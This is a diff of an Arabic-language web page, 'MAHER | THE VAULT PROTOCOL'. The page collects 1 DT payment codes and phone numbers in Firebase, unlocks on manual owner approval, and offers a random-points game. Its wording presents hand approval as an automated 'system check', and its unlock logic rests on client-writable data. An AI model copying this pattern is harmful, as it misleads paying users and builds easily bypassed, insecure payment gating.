@@ -4,75 +4,130 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MAHER | THE VAULT PROTOCOL</title>
-    
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
-
     <style>
-        :root { --neon-green: #00ff41; --dark-bg: #0a0a0a; --error-red: #ff3e3e; }
-        body { background: var(--dark-bg); color: var(--neon-green); font-family: 'Courier New', Courier, monospace; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .vault-box { border: 2px solid var(--neon-green); padding: 30px; width: 90%; max-width: 450px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); text-align: center; background: #000; }
-        .timer { font-size: 3.5rem; color: var(--error-red); margin: 15px 0; text-shadow: 0 0 15px var(--error-red); }
-        input, select { background: #111; border: 1px solid var(--neon-green); color: #fff; padding: 12px; width: 100%; margin: 10px 0; box-sizing: border-box; outline: none; }
-        button { background: var(--neon-green); color: #000; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; font-size: 1.1rem; transition: 0.3s; }
-        button:hover { background: #000; color: var(--neon-green); border: 1px solid var(--neon-green); }
+        :root { --neon: #00ff41; --bg: #050505; --red: #ff3e3e; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; text-align: center; }
+        .vault-container { border: 2px solid var(--neon); padding: 25px; width: 90%; max-width: 400px; box-shadow: 0 0 15px rgba(0,255,65,0.2); }
+        input, select { background: #000; border: 1px solid var(--neon); color: #fff; padding: 10px; width: 100%; margin: 10px 0; box-sizing: border-box; }
+        button { background: var(--neon); color: #000; border: none; padding: 12px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
         .hidden { display: none; }
-        .stats { display: flex; justify-content: space-around; border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 20px; }
-        #system-msg { font-size: 0.8rem; color: #888; margin-bottom: 20px; text-transform: uppercase; }
+        .timer { font-size: 2.5rem; color: var(--red); margin: 10px 0; }
+        .status-bar { font-size: 0.7rem; color: #666; margin-bottom: 20px; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
-<div class="vault-box">
-    <h1 style="letter-spacing: 10px;">MAHER</h1>
-    <div id="system-msg">Status: Waiting for Access Key...</div>
+<div class="vault-container">
+    <h1 style="letter-spacing: 5px;">MAHER</h1>
+    <div class="status-bar" id="sys-msg">Waiting for Access Key...</div>
 
-    <div id="screen-pay">
-        <p>ادفع 1 DT (D17 أو Ticket) للحصول على مفتاح العبور</p>
+    <div id="step-1">
+        <p>بروتوكول الدخول: 1 DT</p>
         <select id="pay-type">
-            <option value="D17">تحويل D17</option>
-            <option value="Ticket">Ticket Recharge</option>
+            <option value="D17">D17 Transfer</option>
+            <option value="Recharge">Ticket Recharge</option>
         </select>
-        <input type="text" id="pay-code" placeholder="أدخل الكود هنا">
-        <button onclick="submitKey()">طلب تفعيل البروتوكول</button>
+        <input type="text" id="pay-code" placeholder="أدخل رقم العملية أو الكود">
+        <button onclick="requestAccess()">إرسال للمراجعة</button>
     </div>
 
-    <div id="screen-profile" class="hidden">
+    <div id="step-wait" class="hidden">
+        <p style="color: #fff;">جاري مراجعة الكود من قبل النظام...</p>
+        <p>يرجى الانتظار، سيفتح الحساب تلقائياً عند التأكد من الدفع.</p>
+        <div class="loader">⚙️ التحقق من السيولة...</div>
+    </div>
+
+    <div id="step-2" class="hidden">
         <div class="timer" id="timer">15:00</div>
-        <input type="text" id="user-alias" placeholder="الاسم المستعار">
-        <input type="text" id="user-phone" placeholder="رقم الهاتف">
-        <button onclick="saveProfile()">تأمين الهوية</button>
+        <input type="text" id="alias" placeholder="الاسم المستعار">
+        <input type="text" id="phone" placeholder="رقم الهاتف">
+        <button onclick="activateVault()">دخول المخزن</button>
     </div>
 
-    <div id="screen-vault" class="hidden">
-        <div class="stats">
-            <div>المحفظة: <span id="val-balance">1.000</span> DT</div>
-            <div>النقاط: <span id="val-points">0</span></div>
+    <div id="step-3" class="hidden">
+        <div style="display:flex; justify-content:space-around; margin-bottom:20px; font-size:0.8rem;">
+            <div>رصيد: <span id="balance">1.000</span> DT</div>
+            <div>نقاط: <span id="points">0</span></div>
         </div>
-        <div id="game-area">
-            <p>فك التشفير اليومي</p>
-            <div id="display" style="font-size: 2.5rem; margin: 20px 0;">000000</div>
-            <button onclick="playGame()" id="game-btn">تجميد</button>
+        <div id="game-ui">
+            <div id="stream" style="font-size: 2rem; background:#111; padding:15px; margin:10px 0;">000000</div>
+            <button onclick="play()">تجميد التشفير</button>
         </div>
     </div>
 </div>
 
 <script>
-    // إعدادات مشروعك M-TOKEN
+    // الإعدادات المربوطة برابطك الجديد
     const firebaseConfig = {
-        databaseURL: "https://m-token-5ce65-default-rtdb.firebaseio.com/",
+        databaseURL: "https://m-token-5ce65-default-rtdb.europe-west1.firebasedatabase.app/",
         projectId: "m-token-5ce65",
     };
-    
     firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
+    const db = firebase.database();
 
-    let timeLeft = 15 * 60;
-    let timerId;
-    let userId = "";
+    let uId = "";
+    let timer;
 
-    function submitKey() {
+    // 1. إرسال الكود والانتظار
+    function requestAccess() {
         const code = document.getElementById('pay-code').value;
-        if (code.length < 5) return alert("الكود قصير جداً");
+        if(code.length < 5) return alert("الكود غير صالح");
 
-        userId = "User_" + Math.floor(Math.random
+        uId = "User_" + Math.floor(Math.random() * 10000);
+        db.ref('requests/' + uId).set({
+            code: code,
+            type: document.getElementById('pay-type').value,
+            approved: false // افتراضياً غير مقبول
+        });
+
+        document.getElementById('step-1').classList.add('hidden');
+        document.getElementById('step-wait').classList.remove('hidden');
+
+        // مراقبة قاعدة البيانات: إذا قمت أنت بتغيير approved إلى true سيفتح الموقع
+        db.ref('requests/' + uId + '/approved').on('value', (snapshot) => {
+            if(snapshot.val() === true) {
+                document.getElementById('step-wait').classList.add('hidden');
+                document.getElementById('step-2').classList.remove('hidden');
+                startTimer();
+            }
+        });
+    }
+
+    function startTimer() {
+        let sec = 15 * 60;
+        timer = setInterval(() => {
+            let m = Math.floor(sec / 60);
+            let s = sec % 60;
+            document.getElementById('timer').innerText = `${m}:${s < 10 ? '0'+s : s}`;
+            if(sec <= 0) { clearInterval(timer); location.reload(); }
+            sec--;
+        }, 1000);
+    }
+
+    function activateVault() {
+        const a = document.getElementById('alias').value;
+        const p = document.getElementById('phone').value;
+        if(!a || !p) return alert("بيانات ناقصة");
+        
+        db.ref('users/' + uId).set({ alias: a, phone: p, points: 0 });
+        clearInterval(timer);
+        document.getElementById('step-2').classList.add('hidden');
+        document.getElementById('step-3').classList.remove('hidden');
+    }
+
+    function play() {
+        let d = document.getElementById('stream');
+        let count = 0;
+        let si = setInterval(() => { d.innerText = Math.floor(Math.random()*900000); count++; }, 50);
+        setTimeout(() => {
+            clearInterval(si);
+            let p = Math.floor(Math.random()*100);
+            d.innerText = "+" + p + " POINTS";
+            document.getElementById('points').innerText = p;
+        }, 1500);
+    }
+</script>
+</body>
+</html>
